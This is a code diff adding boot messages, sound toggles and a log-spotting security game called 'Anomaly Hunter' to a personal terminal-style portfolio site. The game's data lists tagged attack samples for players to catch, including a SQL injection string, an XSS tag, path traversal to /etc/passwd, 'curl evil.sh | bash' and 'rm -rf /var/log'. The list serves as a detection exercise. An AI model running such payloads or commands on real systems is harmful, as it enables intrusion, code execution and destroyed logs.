@@ -199,3 +199,103 @@ export const KONAMI_LINES = [
   'Konami code accepted. +30 lives.',
   'Spring mode unlocked: bahar means spring, so here are some blossoms.',
 ];
+
+/* ------------------------------------------------------------------ */
+/* Boot sequence (first visit in a browser session)                    */
+/* ------------------------------------------------------------------ */
+
+export interface BootLine {
+  /** Shown in green brackets, like systemd. Leave out for a plain line. */
+  status?: string;
+  text: string;
+}
+
+export const BOOT_LINES: BootLine[] = [
+  { text: 'baharayazi.com · booting...' },
+  { status: 'OK', text: 'Started coffee.service: first cup brewed' },
+  { status: 'OK', text: 'Mounted /home/bahar' },
+  { status: 'OK', text: 'Loaded backend-experience (3+ years)' },
+  { status: 'OK', text: 'Started masc@uvic.service' },
+  { status: 'OK', text: 'Reached target spring.target ✿' },
+];
+
+/* ------------------------------------------------------------------ */
+/* sound                                                               */
+/* ------------------------------------------------------------------ */
+
+export const SOUND_LINES = {
+  on: 'Sound on. Keys click, coffee pours, and mistakes buzz.',
+  off: 'Sound off. Silence is golden.',
+  usage: 'Tip: sound on, sound off, or just sound to switch.',
+};
+
+/* ------------------------------------------------------------------ */
+/* quick view                                                          */
+/* ------------------------------------------------------------------ */
+
+export const QUICK_LINES = {
+  opened: 'Opening the one-page version. Press Esc to come back to the terminal.',
+};
+
+/* ------------------------------------------------------------------ */
+/* game: Anomaly Hunter                                                */
+/* ------------------------------------------------------------------ */
+
+export interface BadLogLine {
+  text: string;
+  /** What kind of attack it is, shown when it is caught or missed. */
+  tag: string;
+}
+
+export const GAME = {
+  title: 'ANOMALY HUNTER',
+  logFile: 'tail -f /var/log/baharayazi.log',
+  intro: [
+    'Server logs are streaming. Most lines are normal traffic, some are attacks.',
+    'When an attack reaches the ▶ scanner row, flag it before it slips past.',
+    'Catch attacks for points. Flagging normal traffic is a false alarm. Miss 3 attacks and the server is breached.',
+  ],
+  startDesktop: 'Press Space to start · Space to flag · Esc to quit',
+  startTouch: 'Tap the log to start, then tap to flag',
+  good: [
+    'GET /api/projects 200 14ms',
+    'GET /health 200 2ms',
+    'POST /api/contact 201',
+    'GET /static/app.js 304',
+    'redis: cache hit ratio 0.97',
+    'kafka: consumer lag 3 msgs',
+    'celery: task sync_orders done',
+    'cron: nightly backup ok',
+    'login ok user=sara (2FA)',
+    'GET /cv.pdf 200 41ms',
+    'db: orders_by_day query 8ms',
+    'deploy: build #214 passed',
+    'GET /api/skills 200 9ms',
+    'tls: cert renewed, 89 days left',
+    'payment: refund #8812 approved',
+    'GET /favicon.ico 200',
+  ],
+  bad: [
+    { text: "GET /search?q=' OR 1=1 --", tag: 'SQL injection' },
+    { text: 'GET /../../etc/passwd', tag: 'path traversal' },
+    { text: 'POST /login 401 x60 in 10s', tag: 'brute force' },
+    { text: 'GET /?name=<script>alert(1)', tag: 'XSS' },
+    { text: 'outbound 4.2 GB to unknown host', tag: 'data exfiltration' },
+    { text: 'cpu 100% process=xmrig', tag: 'cryptominer' },
+    { text: 'sudo: www-data NOT in sudoers', tag: 'privilege escalation' },
+    { text: 'port scan: 1,000 ports in 2s', tag: 'port scan' },
+    { text: 'admin login 3am, new country', tag: 'suspicious login' },
+    { text: 'rm -rf /var/log by www-data', tag: 'log tampering' },
+    { text: 'exec: curl evil.sh | bash', tag: 'remote code execution' },
+    { text: 'GET /wp-admin.php 404', tag: 'vulnerability probe' },
+    { text: 'new ssh key added for root', tag: 'persistence' },
+    { text: 'payment: refund #8812 x2 sent', tag: 'duplicate refund' },
+  ] as BadLogLine[],
+  /** Shown at game over, picked by the first threshold the score is under. */
+  ranks: [
+    { under: 40, text: 'Rough shift. Every security engineer starts as a junior analyst.' },
+    { under: 120, text: 'Solid on-call shift. The servers thank you.' },
+    { under: 250, text: 'Senior SOC material. Those are some fast reflexes.' },
+    { under: Infinity, text: 'You belong on a security team. (So does Bahar: run contact.)' },
+  ],
+};
